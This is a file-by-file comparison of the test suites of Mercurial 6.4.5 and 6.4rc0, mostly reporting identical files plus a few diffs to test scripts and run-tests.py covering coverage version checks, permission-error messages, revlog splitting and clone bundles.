### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-fold-extend-front.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-fold-extend-front.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-fold-fold-end.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-fold-fold-end.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-fold-immutable.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-fold-immutable.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-fold-initial.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-fold-initial.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-fold-no-changes.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-fold-no-changes.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-fold-split-end.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-fold-split-end.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-fold-updated.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-fold-updated.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-hash-fixes.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-hash-fixes.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-no-restack-orphan.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-no-restack-orphan.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-skipped.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-skipped.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabsend-update-alpha-create-beta.json` & `mercurial-6.4rc0/tests/phabricator/phabsend-update-alpha-create-beta.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabupdate-change-6876.json` & `mercurial-6.4rc0/tests/phabricator/phabupdate-change-6876.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/phabricator/phabupdate-revs.json` & `mercurial-6.4rc0/tests/phabricator/phabupdate-revs.json`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/printenv.py` & `mercurial-6.4rc0/tests/printenv.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/printrevset.py` & `mercurial-6.4rc0/tests/printrevset.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/pullext.py` & `mercurial-6.4rc0/tests/pullext.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/remotefilelog-getflogheads.py` & `mercurial-6.4rc0/tests/remotefilelog-getflogheads.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/remotefilelog-library.sh` & `mercurial-6.4rc0/tests/remotefilelog-library.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/revlog-formatv0.py` & `mercurial-6.4rc0/tests/revlog-formatv0.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/revnamesext.py` & `mercurial-6.4rc0/tests/revnamesext.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/run-tests.py` & `mercurial-6.4rc0/tests/run-tests.py`

 * *Files 0% similar despite different names*

```diff
@@ -68,14 +68,20 @@
 import tempfile
 import threading
 import time
 import unittest
 import uuid
 import xml.dom.minidom as minidom
 
+try:
+    # PEP 632 recommend the use of `packaging.version` to replace the
+    # deprecated `distutil.version`. So lets do it.
+    import packaging.version as version
+except ImportError:
+    import distutils.version as version
 
 if sys.version_info < (3, 5, 0):
     print(
         '%s is only supported on Python 3.5+, not %s'
         % (sys.argv[0], '.'.join(str(v) for v in sys.version_info[:3]))
     )
     sys.exit(70)  # EX_SOFTWARE from `man 3 sysexit`
@@ -789,15 +795,17 @@
         )
 
     options.anycoverage = options.cover or options.annotate or options.htmlcov
     if options.anycoverage:
         try:
             import coverage
 
-            coverage.__version__  # silence unused import warning
+            covver = version.StrictVersion(coverage.__version__).version
+            if covver < (3, 3):
+                parser.error('coverage options require coverage 3.3 or later')
         except ImportError:
             parser.error('coverage options now require the coverage package')
 
     if options.anycoverage and options.local:
         # this needs some path mangling somewhere, I guess
         parser.error(
             "sorry, coverage options do not work when --local " "is specified"
```

### Comparing `mercurial-6.4.5/tests/seq.py` & `mercurial-6.4rc0/tests/seq.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/silenttestrunner.py` & `mercurial-6.4rc0/tests/silenttestrunner.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/simplestorerepo.py` & `mercurial-6.4rc0/tests/simplestorerepo.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/sshprotoext.py` & `mercurial-6.4rc0/tests/sshprotoext.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/sslcerts/README` & `mercurial-6.4rc0/tests/sslcerts/README`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/sslcerts/client-cert.pem` & `mercurial-6.4rc0/tests/sslcerts/client-cert.pem`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/sslcerts/client-key-decrypted.pem` & `mercurial-6.4rc0/tests/sslcerts/client-key-decrypted.pem`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/sslcerts/client-key.pem` & `mercurial-6.4rc0/tests/sslcerts/client-key.pem`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/sslcerts/priv.pem` & `mercurial-6.4rc0/tests/sslcerts/priv.pem`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/sslcerts/pub-expired.pem` & `mercurial-6.4rc0/tests/sslcerts/pub-expired.pem`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/sslcerts/pub-not-yet.pem` & `mercurial-6.4rc0/tests/sslcerts/pub-not-yet.pem`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/sslcerts/pub-other.pem` & `mercurial-6.4rc0/tests/sslcerts/pub-other.pem`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/sslcerts/pub.pem` & `mercurial-6.4rc0/tests/sslcerts/pub.pem`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/branches.svndump` & `mercurial-6.4rc0/tests/svn/branches.svndump`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/empty.svndump` & `mercurial-6.4rc0/tests/svn/empty.svndump`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/encoding.svndump` & `mercurial-6.4rc0/tests/svn/encoding.svndump`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/move.svndump` & `mercurial-6.4rc0/tests/svn/move.svndump`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/replace.svndump` & `mercurial-6.4rc0/tests/svn/replace.svndump`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/startrev.svndump` & `mercurial-6.4rc0/tests/svn/startrev.svndump`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/svndump-branches.sh` & `mercurial-6.4rc0/tests/svn/svndump-branches.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/svndump-empty.sh` & `mercurial-6.4rc0/tests/svn/svndump-empty.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/svndump-encoding.sh` & `mercurial-6.4rc0/tests/svn/svndump-encoding.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/svndump-move.sh` & `mercurial-6.4rc0/tests/svn/svndump-move.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/svndump-replace.sh` & `mercurial-6.4rc0/tests/svn/svndump-replace.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/svndump-startrev.sh` & `mercurial-6.4rc0/tests/svn/svndump-startrev.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/svndump-tags.sh` & `mercurial-6.4rc0/tests/svn/svndump-tags.sh`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn/tags.svndump` & `mercurial-6.4rc0/tests/svn/tags.svndump`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svn-safe-append.py` & `mercurial-6.4rc0/tests/svn-safe-append.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/svnxml.py` & `mercurial-6.4rc0/tests/svnxml.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-abort-checkin.t` & `mercurial-6.4rc0/tests/test-abort-checkin.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-absorb-edit-lines.t` & `mercurial-6.4rc0/tests/test-absorb-edit-lines.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-absorb-filefixupstate.py` & `mercurial-6.4rc0/tests/test-absorb-filefixupstate.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-absorb-rename.t` & `mercurial-6.4rc0/tests/test-absorb-rename.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-absorb-strip.t` & `mercurial-6.4rc0/tests/test-absorb-strip.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-absorb-unfinished.t` & `mercurial-6.4rc0/tests/test-absorb-unfinished.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-absorb.t` & `mercurial-6.4rc0/tests/test-absorb.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-acl.t` & `mercurial-6.4rc0/tests/test-acl.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-add.t` & `mercurial-6.4rc0/tests/test-add.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-addremove-similar.t` & `mercurial-6.4rc0/tests/test-addremove-similar.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-addremove.t` & `mercurial-6.4rc0/tests/test-addremove.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-alias.t` & `mercurial-6.4rc0/tests/test-alias.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-amend-subrepo.t` & `mercurial-6.4rc0/tests/test-amend-subrepo.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-amend.t` & `mercurial-6.4rc0/tests/test-amend.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ancestor.py` & `mercurial-6.4rc0/tests/test-ancestor.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-ancestor.py.out` & `mercurial-6.4rc0/tests/test-ancestor.py.out`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-annotate.py` & `mercurial-6.4rc0/tests/test-annotate.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-annotate.t` & `mercurial-6.4rc0/tests/test-annotate.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-arbitraryfilectx.t` & `mercurial-6.4rc0/tests/test-arbitraryfilectx.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-archive-symlinks.t` & `mercurial-6.4rc0/tests/test-archive-symlinks.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-archive.t` & `mercurial-6.4rc0/tests/test-archive.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-atomictempfile.py` & `mercurial-6.4rc0/tests/test-atomictempfile.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-audit-path.t` & `mercurial-6.4rc0/tests/test-audit-path.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-audit-subrepo.t` & `mercurial-6.4rc0/tests/test-audit-subrepo.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-automv.t` & `mercurial-6.4rc0/tests/test-automv.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-backout.t` & `mercurial-6.4rc0/tests/test-backout.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bad-extension.t` & `mercurial-6.4rc0/tests/test-bad-extension.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-basic.t` & `mercurial-6.4rc0/tests/test-basic.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-batching.py` & `mercurial-6.4rc0/tests/test-batching.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bdiff.py` & `mercurial-6.4rc0/tests/test-bdiff.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bheads.t` & `mercurial-6.4rc0/tests/test-bheads.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bisect.t` & `mercurial-6.4rc0/tests/test-bisect.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bisect2.t` & `mercurial-6.4rc0/tests/test-bisect2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bisect3.t` & `mercurial-6.4rc0/tests/test-bisect3.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-blackbox.t` & `mercurial-6.4rc0/tests/test-blackbox.t`

 * *Files 1% similar despite different names*

```diff
@@ -318,16 +318,16 @@
   1970-01-01 00:00:00.000 bob @45589e459b2edfbf3dbde7e01f611d2c1e7453d7 (5000)> blackbox
 
 Skip rotation if the .hg is read-only
 
 #if unix-permissions
   $ chmod -w .hg
   $ hg log -r. -T '{rev}\n' --config blackbox.maxsize=1 --debug
-  warning: cannot rename '$TESTTMP/blackboxtest3/.hg/blackbox.log.1' to '$TESTTMP/blackboxtest3/.hg/blackbox.log': $EACCES$
-  warning: cannot write to blackbox.log: $EACCES$
+  warning: cannot rename '$TESTTMP/blackboxtest3/.hg/blackbox.log.1' to '$TESTTMP/blackboxtest3/.hg/blackbox.log': Permission denied
+  warning: cannot write to blackbox.log: Permission denied
   1
   $ chmod +w .hg
 #endif
 
 Test log recursion from dirty status check
 
   $ cat > ../r.py <<EOF
@@ -466,24 +466,23 @@
   > cmdtable = {}
   > command = registrar.command(cmdtable)
   > @command(b'raise')
   > def raisecmd(*args):
   >     raise RuntimeError('raise')
   > EOF
 
-
-  $ hg init $TESTTMP/blackbox-exception-only --config blackbox.track=commandexception
-  $ cat >> $TESTTMP/blackbox-exception-only/.hg/hgrc << EOF
+  $ cat >> $HGRCPATH << EOF
   > [blackbox]
   > track = commandexception
   > [extensions]
   > raise=$TESTTMP/raise.py
   > EOF
-  $ cd $TESTTMP/blackbox-exception-only
 
+  $ hg init $TESTTMP/blackbox-exception-only
+  $ cd $TESTTMP/blackbox-exception-only
 
 #if chg
  (chg exits 255 because it fails to receive an exit code)
   $ hg raise 2>/dev/null
   [255]
 #else
  (hg exits 1 because Python default exit code for uncaught exception is 1)
@@ -492,29 +491,7 @@
 #endif
 
   $ head -1 .hg/blackbox.log
   1970-01-01 00:00:00.000 bob @0000000000000000000000000000000000000000 (5000)> ** Unknown exception encountered with possibly-broken third-party extension "mock" (version N/A)
   $ tail -2 .hg/blackbox.log
   RuntimeError: raise
   
-  $ cd ..
-
-Check we did not broke `hg mv`
-------------------------------
-(we did in 6.4rc)
-
-basic setup
-
-  $ hg init blackbox-file-move
-  $ cd blackbox-file-move
-  $ echo foo > foo
-  $ hg add foo
-  $ hg commit -m 'foo'
-
-copy a file
-
-  $ hg copy foo bar
-
-move a file
-
-  $ hg mv foo goo
-
```

### Comparing `mercurial-6.4.5/tests/test-bookflow.t` & `mercurial-6.4rc0/tests/test-bookflow.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bookmarks-corner-case.t` & `mercurial-6.4rc0/tests/test-bookmarks-corner-case.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bookmarks-current.t` & `mercurial-6.4rc0/tests/test-bookmarks-current.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bookmarks-merge.t` & `mercurial-6.4rc0/tests/test-bookmarks-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bookmarks-pushpull.t` & `mercurial-6.4rc0/tests/test-bookmarks-pushpull.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bookmarks-rebase.t` & `mercurial-6.4rc0/tests/test-bookmarks-rebase.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bookmarks-strip.t` & `mercurial-6.4rc0/tests/test-bookmarks-strip.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bookmarks.t` & `mercurial-6.4rc0/tests/test-bookmarks.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-branch-change.t` & `mercurial-6.4rc0/tests/test-branch-change.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-branch-option.t` & `mercurial-6.4rc0/tests/test-branch-option.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-branch-tag-confict.t` & `mercurial-6.4rc0/tests/test-branch-tag-confict.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-branches.t` & `mercurial-6.4rc0/tests/test-branches.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bugzilla.t` & `mercurial-6.4rc0/tests/test-bugzilla.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bundle-phases.t` & `mercurial-6.4rc0/tests/test-bundle-phases.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bundle-r.t` & `mercurial-6.4rc0/tests/test-bundle-r.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bundle-type.t` & `mercurial-6.4rc0/tests/test-bundle-type.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bundle-vs-outgoing.t` & `mercurial-6.4rc0/tests/test-bundle-vs-outgoing.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bundle.t` & `mercurial-6.4rc0/tests/test-bundle.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bundle2-exchange.t` & `mercurial-6.4rc0/tests/test-bundle2-exchange.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bundle2-format.t` & `mercurial-6.4rc0/tests/test-bundle2-format.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bundle2-multiple-changegroups.t` & `mercurial-6.4rc0/tests/test-bundle2-multiple-changegroups.t`

 * *Files 17% similar despite different names*

```diff
@@ -451,107 +451,7 @@
   | |
   | @  2:f838bfaca5c7 public test  C
   |/
   o  1:27547f69f254 public test  B
   |
   o  0:4a2df7238c3b public test  A
   
-
-Test that "split" from inline content works fine (cf issue6811)
-===============================================================
-
-setup
------
-
-(create a compression free version where the split is easier to trigger)
-
-  $ cat >> $HGRCPATH << EOF
-  > [format]
-  > revlog-compression=none
-  > use-persistent-nodemap=no
-  > EOF
-
-  $ cd ..
-  $ hg clone --pull repo repo-test-split --quiet
-  pullop.cgresult is 2
-  $ cat > repo-test-split/.hg/hgrc << EOF
-  > [extensions]
-  > bundle2=$TESTTMP/bundle2.py
-  > EOF
-  $ hg clone --pull repo-test-split clone-test-split --quiet
-  pullop.cgresult is 2
-  $ cd repo-test-split
-  $ cat > .hg/hgrc << EOF
-  > [extensions]
-  > bundle2=$TESTTMP/bundle2.py
-  > EOF
-
-
-IMPORTANT: must be a non-split revlog with only a .i
-  $ ls -1 .hg/store/00manifest.*
-  .hg/store/00manifest.i
-  $ ls -1 .hg/store/data/_a.*
-  .hg/store/data/_a.i
-
-  $ $TESTDIR/seq.py 100000 > A
-  $ mkdir foo
-  $ cd foo
-  $ touch `$TESTDIR/seq.py 10000`
-  $ cd ..
-  $ hg add -q foo
-  $ hg commit -m 'split the manifest and one filelog'
-
-
-IMPORTANT: now the revlogs must be split
-  $ ls -1 .hg/store/00manifest.*
-  .hg/store/00manifest.d
-  .hg/store/00manifest.i
-  $ ls -1 .hg/store/data/_a.*
-  .hg/store/data/_a.d
-  .hg/store/data/_a.i
-
-Add an extra commit on top of that
-
-  $ echo foo >> A
-  $ hg commit -m 'one extra commit'
-
-
-Actual testing
---------------
-
-  $ cd ../clone-test-split
-
-We now pull this in the clone the split should be in one changegroup, the update in another one
-
-  $ hg  pull
-  pulling from $TESTTMP/repo-test-split
-  searching for changes
-  remote: changegroup1
-  adding changesets
-  adding manifests
-  adding file changes
-  remote: changegroup2
-  adding changesets
-  adding manifests
-  adding file changes
-  added 2 changesets with 10002 changes to 10002 files
-  new changesets 5e5bf9c91085:900b170f70d0
-  pullop.cgresult is 1
-  (run 'hg update' to get a working copy)
-
-IMPORTANT: now the revlogs must be split
-  $ ls -1 .hg/store/00manifest.*
-  .hg/store/00manifest.d
-  .hg/store/00manifest.i
-  $ ls -1 .hg/store/data/_a.*
-  .hg/store/data/_a.d
-  .hg/store/data/_a.i
-
-manifest should work
-
-  $ hg  files -r tip | wc -l
-  \s*10007 (re)
-
-file content should work
-
-  $ hg  cat -r tip A | wc -l
-  \s*100001 (re)
```

### Comparing `mercurial-6.4.5/tests/test-bundle2-pushback.t` & `mercurial-6.4rc0/tests/test-bundle2-pushback.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-bundle2-remote-changegroup.t` & `mercurial-6.4rc0/tests/test-bundle2-remote-changegroup.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-byteify-strings.t` & `mercurial-6.4rc0/tests/test-byteify-strings.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-cache-abuse.t` & `mercurial-6.4rc0/tests/test-cache-abuse.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-cappedreader.py` & `mercurial-6.4rc0/tests/test-cappedreader.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-casecollision-merge.t` & `mercurial-6.4rc0/tests/test-casecollision-merge.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-casecollision.t` & `mercurial-6.4rc0/tests/test-casecollision.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-casefolding.t` & `mercurial-6.4rc0/tests/test-casefolding.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-cat.t` & `mercurial-6.4rc0/tests/test-cat.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-cbor.py` & `mercurial-6.4rc0/tests/test-cbor.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-censor.t` & `mercurial-6.4rc0/tests/test-censor.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-censor2.t` & `mercurial-6.4rc0/tests/test-censor2.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-changelog-exec.t` & `mercurial-6.4rc0/tests/test-changelog-exec.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-code.t` & `mercurial-6.4rc0/tests/test-check-code.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-commit.t` & `mercurial-6.4rc0/tests/test-check-commit.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-config.t` & `mercurial-6.4rc0/tests/test-check-config.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-encoding.t` & `mercurial-6.4rc0/tests/test-check-encoding.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-execute.t` & `mercurial-6.4rc0/tests/test-check-execute.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-help.t` & `mercurial-6.4rc0/tests/test-check-help.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-interfaces.py` & `mercurial-6.4rc0/tests/test-check-interfaces.py`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-module-imports.t` & `mercurial-6.4rc0/tests/test-check-module-imports.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-py3-compat.t` & `mercurial-6.4rc0/tests/test-check-py3-compat.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-pyflakes.t` & `mercurial-6.4rc0/tests/test-check-pyflakes.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-pylint.t` & `mercurial-6.4rc0/tests/test-check-pylint.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-check-shbang.t` & `mercurial-6.4rc0/tests/test-check-shbang.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-chg.t` & `mercurial-6.4rc0/tests/test-chg.t`

 * *Files 2% similar despite different names*

```diff
@@ -549,24 +549,7 @@
 (Disabling with --no-profile on the commandline still works, but isn't permanent)
   $ newchg log -r . --no-profile
   $ filteredchg log -r .
   Sample count: * (glob)
   $ filteredchg log -r . --no-profile
   $ filteredchg log -r .
   Sample count: * (glob)
-
-chg setting CHGHG itself
-------------------------
-
-If CHGHG is not set, chg will set it before spawning the command server.
-  $ hg --kill-chg-daemon
-  $ HG=$CHGHG CHGHG= CHGDEBUG= hg debugshell -c \
-  >   'ui.write(b"CHGHG=%s\n" % ui.environ.get(b"CHGHG"))' 2>&1 \
-  >   | egrep 'CHGHG|start'
-  chg: debug: * start cmdserver at * (glob)
-  CHGHG=/*/install/bin/hg (glob)
-
-Running the same command a second time shouldn't spawn a new command server.
-  $ HG=$CHGHG CHGHG= CHGDEBUG= hg debugshell -c \
-  >   'ui.write(b"CHGHG=%s\n" % ui.environ.get(b"CHGHG"))' 2>&1 \
-  >   | egrep 'CHGHG|start'
-  CHGHG=/*/install/bin/hg (glob)
```

### Comparing `mercurial-6.4.5/tests/test-children.t` & `mercurial-6.4rc0/tests/test-children.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-churn.t` & `mercurial-6.4rc0/tests/test-churn.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-clone-cgi.t` & `mercurial-6.4rc0/tests/test-clone-cgi.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-clone-pull-corruption.t` & `mercurial-6.4rc0/tests/test-clone-pull-corruption.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-clone-r.t` & `mercurial-6.4rc0/tests/test-clone-r.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-clone-stream-format.t` & `mercurial-6.4rc0/tests/test-clone-stream-format.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-clone-stream.t` & `mercurial-6.4rc0/tests/test-clone-stream.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-clone-update-order.t` & `mercurial-6.4rc0/tests/test-clone-update-order.t`

 * *Files identical despite different names*

### Comparing `mercurial-6.4.5/tests/test-clone.t` & `mercurial-6.4rc0/tests/test-clone.t`

 * *Files 0% similar despite different names*

```diff
@@ -629,23 +629,23 @@
 #if unix-permissions no-root
 
 Inaccessible source
 
   $ mkdir a
   $ chmod 000 a
   $ hg clone a b
-  abort: $EACCES$: *$TESTTMP/fail/a/.hg* (glob)
+  abort: Permission denied: *$TESTTMP/fail/a/.hg* (glob)
   [255]
 
 Inaccessible destination
 
   $ hg init b
   $ cd b
   $ hg clone . ../a
-  abort: $EACCES$: *../a* (glob)
+  abort: Permission denied: *../a* (glob)
   [255]
   $ cd ..
   $ chmod 700 a
   $ rm -r a b
 
 #endif
```

### Comparing `mercurial-6.4.5/tests/test-clonebundles.t` & `mercurial-6.4rc0/tests/test-clonebundles.t`

 * *Files 8% similar despite different names*

```diff
@@ -55,28 +55,14 @@
   applying clone bundle from http://does.not.exist/bundle.hg
   error fetching bundle: (.* not known|(\[Errno -?\d+] )?([Nn]o address associated with (host)?name|Temporary failure in name resolution|Name does not resolve)) (re) (no-windows !)
   error fetching bundle: [Errno 1100*] getaddrinfo failed (glob) (windows !)
   abort: error applying bundle
   (if this error persists, consider contacting the server operator or disable clone bundles via "--config ui.clonebundles=false")
   [255]
 
-Manifest file with URL with unknown scheme skips the URL
-  $ echo 'weirdscheme://does.not.exist/bundle.hg' > server/.hg/clonebundles.manifest
-  $ hg clone http://localhost:$HGPORT unknown-scheme
-  no compatible clone bundles available on server; falling back to regular clone
-  (you may want to report this to the server operator)
-  requesting all changes
-  adding changesets
-  adding manifests
-  adding file changes
-  added 2 changesets with 2 changes to 2 files
-  new changesets 53245c60e682:aaff8d2ffbbf
-  updating to branch default
-  2 files updated, 0 files merged, 0 files removed, 0 files unresolved
-
 Server is not running aborts
 
   $ echo "http://localhost:$HGPORT1/bundle.hg" > server/.hg/clonebundles.manifest
   $ hg clone http://localhost:$HGPORT server-not-runner
   applying clone bundle from http://localhost:$HGPORT1/bundle.hg
   error fetching bundle: (.* refused.*|Protocol not supported|(.* )?\$EADDRNOTAVAIL\$|.* No route to host) (re)
   abort: error applying bundle
@@ -648,118 +634,7 @@
   bundle2-input-bundle: 2 parts total
   checking for updated bookmarks
   2 local changesets published
   calling hook changegroup.lfiles: hgext.largefiles.reposetup.checkrequireslfiles
   updating the branch cache
   (sent 4 HTTP requests and * bytes; received * bytes in responses) (glob)
   $ killdaemons.py
-
-Testing a clone bundles that involves revlog splitting (issue6811)
